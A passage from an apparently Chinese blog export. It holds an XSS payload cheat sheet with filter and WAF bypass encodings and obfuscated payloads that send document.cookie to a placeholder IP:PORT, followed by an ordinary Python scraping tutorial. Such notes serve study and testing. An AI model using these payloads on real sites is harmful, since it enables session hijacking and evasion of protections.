src&#x3D;javascript:alert(&quot;xss&quot;)&gt;&lt;IMG SRC&#x3D;javascript:alert(String.formCharCode(88,83,83))&gt;&lt;img scr&#x3D;&quot;URL&quot; style&#x3D;&#39;Xss:expression(alert(&#x2F;xss));&#39;&lt;!--CSS标记xss--&gt;&lt;img STYLE&#x3D;&quot;background-image:url(javascript:alert(&#39;XSS&#39;))&quot;&gt;&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;alert(1)&gt;&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(&quot;alert(&#39;xss&#39;)&quot;)&gt;&lt;img src&#x3D;1 onmouseover&#x3D;alert(&#39;xss&#39;)&gt; &lt;a&gt;标签 标准格式 1&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&gt;baidu&lt;&#x2F;a&gt; 方式1 123456&lt;a href&#x3D;&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;javascript:eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:aaa&quot; onmouseover&#x3D;&quot;alert(&#x2F;xss&#x2F;)&quot;&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;)&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;&quot; onclick&#x3D;eval(alert(&#39;xss&#39;))&gt;aa&lt;&#x2F;a&gt;&lt;a href&#x3D;kycg.asp?ttt&#x3D;1000 onmouseover&#x3D;prompt(&#39;xss&#39;) y&#x3D;2016&gt;aa&lt;&#x2F;a&gt; input标签 标准格式 1&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt; XSS利用方式1 123&lt;input value&#x3D;&quot;&quot; onclick&#x3D;alert(&#39;xss&#39;) type&#x3D;&quot;text&quot;&gt;&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot; onmouseover&#x3D;prompt(&#39;xss&#39;) bad&#x3D;&quot;&quot;&gt;&lt;input name&#x3D;&quot;name&quot; value&#x3D;&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt; &lt;form&gt;标签 XSS利用方式1 123456789&lt;form action&#x3D;javascript:alert(&#39;xss&#39;) method&#x3D;&quot;get&quot;&gt;&lt;form action&#x3D;javascript:alert(&#39;xss&#39;)&gt;&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;prompt(&#39;xss&#39;)&gt;&lt;form method&#x3D;post action&#x3D;aa.asp? onmouseover&#x3D;alert(&#39;xss&#39;)&gt;&lt;form action&#x3D;1 onmouseover&#x3D;alert(&#39;xss)&gt;&lt;!--原code--&gt;&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;form method&#x3D;post action&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt; &lt;iframe&gt;标签 XSS利用方式1 12345678&lt;iframe src&#x3D;javascript:alert(&#39;xss&#39;);height&#x3D;5width&#x3D;1000 &#x2F;&gt;&lt;iframe&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;&lt;!--原code--&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;&gt;&lt;!--base64编码--&gt;&lt;iframe src&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4&#x3D;&quot;&gt;&lt;iframe src&#x3D;&quot;aaa&quot; onmouseover&#x3D;alert(&#39;xss&#39;) &#x2F;&gt;&lt;iframe&gt;&lt;iframe src&#x3D;&quot;javascript&amp;colon;prompt&amp;lpar;&#96;xss&#96;&amp;rpar;&quot;&gt;&lt;&#x2F;iframe&gt; svg&lt;&gt;标签 1&lt;svg onload&#x3D;alert(1)&gt; 绕过思路绕过思路有很多,但是分类却有点难,实在是不知道怎么去定义每一类的绕过思路。 1、过滤关键字 大小写绕过、大小写混合 1&lt;ScRipt&gt;ALeRt(&quot;XSS&quot;);&lt;&#x2F;sCRipT&gt; 嵌套,也就是重复 1&lt;sc&lt;script&gt;ript&gt;alert(/xss/)&lt;/script&gt; 代替 iframe就可以代替scriptconfirm和prompt可以代替alert 12345678910&lt;iframe onload=alert(1)&gt;&lt;marquee/onstart=confirm(1)&gt;&lt;details/open/ontoggle=top[&quot;al&quot;+&quot;ert&quot;](1)&gt; 谷歌浏览器 【绕阿里云XSS】&lt;svg/onload=prompt(1)&gt;&lt;style onload=alert(1)&gt;&lt;iframe src=javascript:alert`1`&gt;&lt;body onload=prompt(1);&gt;&lt;select autofocus onfocus=alert(1)&gt;&lt;script&gt;confirm(&#x27;XSS&#x27;)&lt;/script&gt;&lt;script&gt;prompt(&#x27;XSS&#x27;)&lt;/script&gt; HTML5 新增的实体命名编码 12345&amp;colon; =&gt; [冒号]&amp;NewLine; =&gt; [换行]case: &lt;a href=&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;/a&gt; 编码 HTML实体可以使用十进制与十六进制编码; javascript可以使用Unicode与八进制与十六进制进行编码. eval()函数可计算某个字符串,并执行其中的的 JavaScript 代码,可以吧js代码转化为jsunicode,jsunicode可以使用网站http://web.chacuo.net/charsetjsascii 将payload进行进制转化,十六进制前面+&amp;#x,十进制+&amp;# 对于JS编码 unicode配合js的eval函数 12 &lt;img src=&quot;1&quot; onerror=eval(&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#117;&amp;#110;&amp;#105;&amp;#99;&amp;#111;&amp;#100;&amp;#101;&amp;#39;&amp;#41;&quot;)&gt;&lt;/img&gt;&lt;img src=&quot;1&quot; onerror=eval(&quot;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u0027\\u0029&quot;)&gt;&lt;/img&gt; 八进制与十六进制编码 1&lt;script&gt;eval(&quot;\\141\\154\\145\\162\\164\\50\\57\\170\\163\\163\\57\\51&quot;);&lt;/script&gt;（JS八进制编码） eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29\");（JS十六进制编码） 12345- String.fromCharCode &#96;&#96;&#96;csharp&lt;img src&#x3D;&quot;1&quot; onerror&#x3D;eval(String.fromCharCode(97,108,101,114,116,40,39,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,10 1,39,41))&gt;&lt;&#x2F;img&gt; data协议 1 1&lt;object data&#x3D;&quot;data:text&#x2F;html;base64,PHNjcmlwdD5hbGVydCgnZGF0YSBwcm90b2NvbCcpPC9zY3JpcHQ+&quot;&gt;&lt;&#x2F;object&gt; 对html编码 十进制与十六进制 12&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt; （HTML实体十进制编码)&lt;img src=1 onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt; (HTML实体十六进制编码) 1234567891011**js特性**| Payload | 效果 || ------------------------------------------------ | ---------------------- || &#96;&#39;alert(&quot;xss&quot;)&#39;.replace(&#x2F;.*&#x2F;g,eval)&#96; | &#96;eval(&#39;alert(&quot;xss&quot;)&#39;)&#96; || &#96;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&#96; | &#96;alert(1)&#96; || &#96;&#39;bbbalert(1)cccc&#39;.replace(&#x2F;a\\w&#123;4&#125;\\(\\d\\)&#x2F;,eval)&#96; | &#96;eval(&#39;alert(1)&#39;)&#96; |​&#96;&#96;&#96;csharp&lt;script&gt;&#39;str1ng&#39;.replace(&#x2F;1&#x2F;,alert)&lt;&#x2F;script&gt; 2、过滤符号 过滤空格 用/**/或者/12&lt;img/src=&quot;1&quot;/onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt;&lt;img/**/src=&quot;1&quot;/**/onerror=&quot;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x2f;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x2f;&amp;#x29;&quot;&gt; 3、常用函数 atob()与btoa() 1234atob(&quot;L2h0dHA6Lw==&quot;)&quot;/http:/&quot;btoa(/http:/)&quot;L2h0dHA6Lw==&quot; 在 JavaScript 中，有两个函数被分别用来处理解码和编码 base64 字符串： atob() //ASCII to Base64 btoa() //Base64 to ASCII slice() slice() 方法可从已有的数组中返回选定的元素 1arrayObject.slice(start,end) 1atob(btoa(&#x2F;http:&#x2F;)).slice(1).concat(&#x2F;IP:PORT&#x2F;).concat(eval(atob(btoa(&#x2F;docum&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ent.cookie&#x2F;)).slice(1,-1)))) 1&lt;svg onload&#x3D;location.href&#x3D;eval(atob(btoa(&#x2F;docu&#x2F;)).slice(1,-1).concat(atob(btoa(&#x2F;ment.cookie&#x2F;)).slice(1,-1)))&gt;","categories":[{"name":"前端安全","slug":"前端安全","permalink":"http://s1eady.top/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"OWSP-TOP10","slug":"OWSP-TOP10","permalink":"http://s1eady.top/tags/OWSP-TOP10/"}]},{"title":"Python学习--Python爬虫基础","slug":"Python爬虫","date":"2018-12-06T23:20:30.000Z","updated":"2020-10-16T11:37:12.730Z","comments":true,"path":"2018/12/07/Python爬虫/","link":"","permalink":"http://s1eady.top/2018/12/07/Python%E7%88%AC%E8%99%AB/","excerpt":"","text":"Python爬虫Requests库Get请求12345678910111213141516171819202122import requests# 带参数的GET请求,timeout请求超时时间headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;&#125;#params 接收一个字典或者字符串的查询参数，字典类型自动转换为url编码，不需要urlencode()params = &#123;&#x27;key1&#x27;: &#x27;python&#x27;, &#x27;key2&#x27;: &#x27;java&#x27;&#125;#发送get请求并带上参数以及请求头,设置超时时间。r = requests.get(url=&#x27;http://baidu.com&#x27;,headers=headers,params=params, timeout=3)# 注意观察url地址，它已经将参数拼接起来print(&#x27;URL地址：&#x27;, r.url)# 响应状态码，成功返回200，失败40x或50x。print(&#x27;请求状态码：&#x27;, r.status_code)print(&#x27;header信息:&#x27;, r.headers)print(&#x27;cookie信息：&#x27;, r.cookies)#返回响应数据,html内容。print(&#x27;响应的数据：&#x27;, r.text)# 如响应是json数据 ，可以使用 r.json()自动转换为dictprint(&#x27;响应json数据&#x27;, r.json()) 123456789101112131415161718192021URL地址： http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java请求状态码： 200header信息: &#123;&#39;Date&#39;: &#39;Mon, 28 Sep 2020 07:02:06 GMT&#39;, &#39;Content-Type&#39;: &#39;application&#x2F;json&#39;, &#39;Content-Length&#39;: &#39;373&#39;, &#39;Connection&#39;: &#39;keep-alive&#39;, &#39;Server&#39;: &#39;gunicorn&#x2F;19.9.0&#39;, &#39;Access-Control-Allow-Origin&#39;: &#39;*&#39;, &#39;Access-Control-Allow-Credentials&#39;: &#39;true&#39;&#125;cookie信息： &lt;RequestsCookieJar[]&gt;响应的数据： &#123; &quot;args&quot;: &#123; &quot;key1&quot;: &quot;python&quot;, &quot;key2&quot;: &quot;java&quot; &#125;, &quot;headers&quot;: &#123; &quot;Accept&quot;: &quot;*&#x2F;*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Host&quot;: &quot;httpbin.org&quot;, &quot;User-Agent&quot;: &quot;python-requests&#x2F;2.23.0&quot;, &quot;X-Amzn-Trace-Id&quot;: &quot;Root&#x3D;1-5f718a6e-659bccfc8f4f4d2473c9f92c&quot; &#125;, &quot;origin&quot;: &quot;111.14.212.75&quot;, &quot;url&quot;: &quot;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java&quot;&#125;响应json数据 &#123;&#39;args&#39;: &#123;&#39;key1&#39;: &#39;python&#39;, &#39;key2&#39;: &#39;java&#39;&#125;, &#39;headers&#39;: &#123;&#39;Accept&#39;: &#39;*&#x2F;*&#39;, &#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;, &#39;Host&#39;: &#39;httpbin.org&#39;, &#39;User-Agent&#39;: &#39;python-requests&#x2F;2.23.0&#39;, &#39;X-Amzn-Trace-Id&#39;: &#39;Root&#x3D;1-5f718a6e-659bccfc8f4f4d2473c9f92c&#39;&#125;, &#39;origin&#39;: &#39;111.14.212.75&#39;, &#39;url&#39;: &#39;http:&#x2F;&#x2F;httpbin.org&#x2F;get?key1&#x3D;python&amp;key2&#x3D;java&#39;&#125; Post请求1234567891011121314151617import requestsurl = &quot;https://www.lagou.com/jobs/positionAjax.json?city=%E6%B7%B1%E5%9C%B3&amp;needAddtionalResult=false&amp;isSchoolJob=0&quot;headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=&#x27;&#125;data = &#123; &#x27;first&#x27;: &#x27;true&#x27;, &#x27;pn&#x27;: 1, &#x27;kd&#x27;: &#x27;python&#x27;&#125;resp = requests.post(url,headers=headers,data=data)# 如果是json数据，直接可以调用json方法print(resp.json()) 1&#123;&#39;status&#39;: False, &#39;msg&#39;: &#39;请求成功!&#39;, &#39;clientIp&#39;: &#39;111.14.212.75&#39;, &#39;state&#39;: 2402&#125; Get请求与Post请求设置代理使用requests添加代理也非常简单，只要在请求的方法中（比如get或者post）传递proxies参数就可以了。 1234567891011121314import requestsurl = &quot;http://httpbin.org/get&quot;headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;,&#125;proxy = &#123; &#x27;http&#x27;: &#x27;171.14.209.180:27829&#x27;&#125;resp = requests.get(url,headers=headers,proxies=proxy)print(resp.text) 处理请求包123456789import requestsurl = &quot;http://baidu.com&quot;respone=requests.get(&quot;http://baidu.com&quot;)print(respone.headers)print(respone.headers[&#x27;Server&#x27;]) 123➜ Desktop python3 1.py&#123;&#x27;Date&#x27;: &#x27;Mon, 28 Sep 2020 07:20:24 GMT&#x27;, &#x27;Server&#x27;: &#x27;Apache&#x27;, &#x27;Last-Modified&#x27;: &#x27;Tue, 12 Jan 2010 13:48:00 GMT&#x27;, &#x27;ETag&#x27;: &#x27;&quot;51-47cf7e6ee8400&quot;&#x27;, &#x27;Accept-Ranges&#x27;: &#x27;bytes&#x27;, &#x27;Content-Length&#x27;: &#x27;81&#x27;, &#x27;Cache-Control&#x27;: &#x27;max-age=86400&#x27;, &#x27;Expires&#x27;: &#x27;Tue, 29 Sep 2020 07:20:24 GMT&#x27;, &#x27;Connection&#x27;: &#x27;Keep-Alive&#x27;, &#x27;Content-Type&#x27;: &#x27;text/html&#x27;&#125;Apache respone.headers请求包的请求头，返回值是一个字典。 通过对字典操作，取出对应的请求头。 超时1234567import requestsurl = &quot;http://baidu.com&quot;respone=requests.get(&quot;http://sss.com&quot;,timeout=1)print(respone.reason) 1requests.exceptions.ConnectTimeout: HTTPConnectionPool(host=&#x27;sss.com&#x27;, port=80): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPConnection object at 0x10f118550&gt;, &#x27;Connection to sss.com timed out. (connect timeout=1)&#x27;)) timeout 仅对连接过程有效，与响应体的下载无关。 timeout 并不是整个下载响应的时间限制，而是如果服务器在 timeout 秒内没有应答，将会引发一个异常（更精确地说，是在 timeout 秒内没有从基础套接字上接收到任何字节的数据时）If no timeout is specified explicitly, requests do not time out。 cookie操作获取cookie 123456import requestsr = requests.get(&quot;https://www.csdn.net&quot;)print(type(r.cookies), r.cookies)for key, value in r.cookies.items(): print(key + &#x27;=&#x27; + value) 1234&lt;class &#39;requests.cookies.RequestsCookieJar&#39;&gt; &lt;RequestsCookieJar[&lt;Cookie dc_session_id&#x3D;10_1575798031732.659641 for .csdn.net&#x2F;&gt;, &lt;Cookie uuid_tt_dd&#x3D;10_19615575150-1575798031732-646184 for .csdn.net&#x2F;&gt;, &lt;Cookie acw_tc&#x3D;2760827715757980317314369e26895215355a996a74e112d9936f512dacd1 for www.csdn.net&#x2F;&gt;]&gt;dc_session_id&#x3D;10_1575798031732.659641uuid_tt_dd&#x3D;10_19615575150-1575798031732-646184acw_tc&#x3D;2760827715757980317314369e26895215355a996a74e112d9936f512dacd1 在 Requests 中我们使用 cookies 属性就可以直接得到 Cookies 。通过打印我们可以发现它的类型是 requests.cookies.RequestsCookieJar ，然后用 items() 方法将其转化为元组组成的列表，遍历输出每一个 Cookie 的名称和值，实现 Cookie 的遍历解析。 共享cookie 12345678910111213141516171819202122232425import requests# 通过Session类新建一个会话session = requests.Session()post_url = &#x27;https://passport.weibo.cn/sso/login&#x27;# 往下使用requests的地方，直接使用session即可，session就会保存服务器发送过来的cookie信息headers = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;, &#x27;Referer&#x27;: &#x27;https://passport.weibo.cn/signin/login?entry=mweibo&amp;r=http%3A%2F%2Fweibo.cn%2F&amp;backTitle=%CE%A2%B2%A9&amp;vt=&#x27;,&#125;data = &#123; &#x27;username&#x27;: &#x27;17312345678&#x27;, # 账号 &#x27;password&#x27;: &#x27;password&#x27;, # 密码&#125;r = session.post(url=post_url, data=data, headers=headers)# 上面的session会保存会话，往下发送请求，直接使用session即可url = &#x27;https://weibo.cn/6388179289/info&#x27;headers1 = &#123; &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;,&#125;r = session.get(url=url, headers=headers1)print(r.text) 123456import requestss&#x3D;requests.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123456789&#39;)r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)print(s.text)print(r.text) 可以发现两次get请求第一次有cookie但是第二次没cookie 12345678910➜ ~ python &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py&#123; &quot;cookies&quot;: &#123; &quot;number&quot;: &quot;123456789&quot; &#125;&#125;&#123; &quot;cookies&quot;: &#123;&#125;&#125; 如果使用Session() 1234567import requestss &#x3D; requests.Session()s.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123456789&#39;)print(s.text)r &#x3D; s.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)print(r.text) 可以看到两个回话都带有相同cookie 123456789101112➜ ~ python &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py&#123; &quot;cookies&quot;: &#123; &quot;number&quot;: &quot;123456789&quot; &#125;&#125;&#123; &quot;cookies&quot;: &#123; &quot;number&quot;: &quot;123456789&quot; &#125;&#125; requests请求返回对象Response的常用方法Response响应类常用属性与方法： 123456789101112131415Response.url 请求url，[见示例2.1]Response.status_code 响应状态码，[见示例2.1]Response.text 获取响应内容，[见示例2.1]Response.json() 活动响应的JSON内容，[见示例2.1]Response.ok 请求是否成功，status_code&lt;400 返回TrueResponse.headers 响应header信息，[见示例2.1]Response.cookies 响应的cookie，[见示例2.1]Response.elapsed 请求响应的时间。Response.links 返回响应头部的links连接，相当于Response.headers.get(&#39;link&#39;)Response.raw 获取原始套接字响应，需要将初始请求参数stream&#x3D;TrueResponse.content 以字节形式获取响应提，多用于非文本请求，[见示例2.2]Response.iter_content() 迭代获取响应数据，[见示例2.2]Response.history 重定向请求历史记录Response.reason 响应状态的文本原因，如：&quot;Not Found&quot; or &quot;OK&quot;Response.close() 关闭并释放链接，释放后不能再次访问’raw’对象。一般不会调用。 requests的content和text方法的区别 resp.text返回的是Unicode型的数据。 resp.content返回的是bytes型也就是二进制的数据。 简而言之，.text是现成的字符串，.content还要编码，但是.text不是所有时候显示都正常，这是就需要用.content进行手动编码。通常我们需要.content.decode(&#39;编码格式&#39;)，其中编码格式我们需要右键网页源代码，查看网页的编码。 如果你想取文本，可以通过r.text。 如果想取图片，文件，则可以通过r.content。 12345678import requestsjpg_url &#x3D; &#39;http:&#x2F;&#x2F;img2.niutuku.com&#x2F;1312&#x2F;0804&#x2F;0804-niutuku.com-27840.jpg&#39;content &#x3D; requests.get(jpg_url).contentwith open(&#39;demo.jpg&#39;, &#39;wb&#39;) as fp: fp.write(content) 数据提取XPathxpath（XML Path Language）是一门在XML和HTML文档中查找信息的语言，可用来在XML和HTML文档中对元素和属性进行遍历。 XPath语法 XPATH语法 补充 / 如果是在最前面，代表从根节点选取。否则选择某节点下的某个节点 // 从全局节点中选择节点，随便在哪个位置 @ 选取某个节点的属性 . 当前节点 lxml库lxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。 导入lxml 的 etree 库 from lxml import etree 利用etree.HTML，将html字符串（bytes类型或str类型）转化为Element对象，Element对象具有xpath的方法，返回结果的列表 12html &#x3D; etree.HTML(text) ret_list &#x3D; html.xpath(&quot;xpath语法规则字符串&quot;) xpath方法返回列表的三种情况 返回空列表：根据xpath语法规则字符串，没有定位到任何元素 返回由字符串构成的列表：xpath字符串规则匹配的一定是文本内容或某属性的值 返回由Element对象构成的列表：xpath规则字符串匹配的是标签，列表中的Element对象可以继续进行xpath BeautifulSoup4Beautiful Soup 也是一个HTML/XML的解析器，主要的功能也是如何解析和提取 HTML/XML 数据。lxml 只会局部遍历，而Beautiful Soup 是基于HTML DOM（Document Object Model）的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多，所以性能要低于lxml。BeautifulSoup 用来解析 HTML 比较简单，API非常人性化，支持CSS选择器、Python标准库中的HTML解析器，也支持 lxml 的 XML解析器。 Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种: Tag NavigatableString BeautifulSoup Comment 创建bs对象1from bs4 import BeautifulSoupimport requestsresponse &#x3D; requests.get(&#39;https:&#x2F;&#x2F;book.douban.com&#x2F;&#39;).text# print(response)# 创建bs对象soup &#x3D; BeautifulSoup(response, &#39;lxml&#39;) # 使用到了lxml解析库 Tag12345678910111213141516171819from bs4 import BeautifulSouphtml = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;soup = BeautifulSoup(html,&#x27;lxml&#x27;)print(soup.title)print(soup.head)print(soup.a)print(soup.p)print(type(soup.p)) 12345&lt;title&gt;The Dormouse&#39;s story&lt;&#x2F;title&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;a class&#x3D;&quot;sister&quot; href&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;elsie&quot; id&#x3D;&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;&#x2F;a&gt;&lt;p class&#x3D;&quot;title&quot; name&#x3D;&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;&lt;class &#39;bs4.element.Tag&#39;&gt; 我们可以利用 soup 加标签名轻松地获取这些标签的内容，这些对象的类型是bs4.element.Tag。但是注意，它查找的是在所有内容中的第一个符合要求的标签。如果要查询所有的标签，后面会进行介绍。 Tag的两个重要的属性12345678910111213141516print soup.name# [document] #soup 对象本身比较特殊，它的 name 即为 [document]print soup.head.name# head #对于其他内部标签，输出的值便为标签本身的名称print soup.p.attrs# &#123;&#39;class&#39;: [&#39;title&#39;], &#39;name&#39;: &#39;dromouse&#39;&#125;# 在这里，我们把 p 标签的所有属性打印输出了出来，得到的类型是一个字典。print soup.p[&#39;class&#39;] # soup.p.get(&#39;class&#39;)# [&#39;title&#39;] #还可以利用get方法，传入属性的名称，二者是等价的soup.p[&#39;class&#39;] &#x3D; &quot;newClass&quot;print soup.p # 可以对这些属性和内容等等进行修改# &lt;p class&#x3D;&quot;newClass&quot; name&#x3D;&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;&#x2F;b&gt;&lt;&#x2F;p&gt; NavigableString1234567如果拿到标签后，还想获取标签中的内容。那么可以通过tag.string获取标签中的文字。示例代码如下：print soup.p.string# The Dormouse&#39;s storyprint type(soup.p.string)# &lt;class &#39;bs4.element.NavigableString&#39;&gt;thon 搜索文档树find和find_all方法搜索文档树，一般用得比较多的就是两个方法，一个是find，一个是find_all。find方法是找到第一个满足条件的标签后就立即返回，只返回一个元素。find_all方法是把所有满足条件的标签都选到，然后返回回去。 123soup.find_all(&quot;a&quot;,attrs&#x3D;&#123;&quot;id&quot;:&quot;link2&quot;&#125;)或者是直接传入属性的的名字作为关键字参数：soup.find_all(&quot;a&quot;,id&#x3D;&#39;link2&#39;) select方法使用以上方法可以方便的找出元素。但有时候使用css选择器的方式可以更加的方便。使用css选择器的语法，应该使用select方法。以下列出几种常用的css选择器方法： （1）通过标签名查找： 1print(soup.select(&#x27;a&#x27;)) （2）通过类名查找： 通过类名，则应该在类的前面加一个.。比如要查找class=sister的标签。示例代码如下： 1print(soup.select(&#x27;.sister&#x27;)) （3）通过id查找： 通过id查找，应该在id的名字前面加一个＃号。示例代码如下： 1print(soup.select(&quot;#link1&quot;)) （4）组合查找： 组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开： 1print(soup.select(&quot;p #link1&quot;)) 直接子标签查找，则使用 &gt; 分隔： 1print(soup.select(&quot;head &gt; title&quot;)) （5）通过属性查找： 查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。示例代码如下： 1print(soup.select(&#x27;a[href=&quot;http://example.com/elsie&quot;]&#x27;)) （6）获取内容 以上的 select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容。 123456soup = BeautifulSoup(html, &#x27;lxml&#x27;)print type(soup.select(&#x27;title&#x27;))print soup.select(&#x27;title&#x27;)[0].get_text()for title in soup.select(&#x27;title&#x27;): print title.get_text() 正则表达式数量词 **{n}**——作用于前一个字符或子表达式，匹配它重复n次 **{min,max}**——作用于前一个字符或子表达式，匹配它重复重复多少次min~max次，min和max可只写一个设置重复下限或上限，但逗号不能省，不写min时min默认为0 *****——星号，作用于前一个字符或子表达式，匹配它零次或多次 **+**——作用于前一个字符或子表达式，匹配它至少一次 **?**——作用于前一个字符或子表达式，匹配它零次或一次 1234r&#39;z&#123;3&#125;&#39;#匹配zzzr&#39;z&#123;0,3&#125;&#39;#匹配z或zz或zzzr&#39;(?:abc)&#123;2&#125;&#39;#对子表达式匹配两次，匹配abcabc，(?:)是一个用法，不分组的意思，详看后面#星号加号问号同理 预定字符集 \\d——匹配任一个数字（0~9） \\D——匹配一个非数字字符，与\\d互补 \\s——匹配一个空白字符，包括空格，\\t,\\n,\\r,\\n,\\f,\\v \\S——匹配一个非空白字符 \\w——匹配一个单词字符。unicode下匹配各种语言的单个字符，单个数字，和下横线。ASCII下匹配单个英文字母，单个数字，和下横线 \\W——匹配一个非单词字符 1r&#39;\\w&#39; #能匹配&#39;物语&amp;ものがたり&#39;中的：物，语，も，の，が，た，り，汉语日语的单字，其他语言同理 分组&amp;或&amp;转义 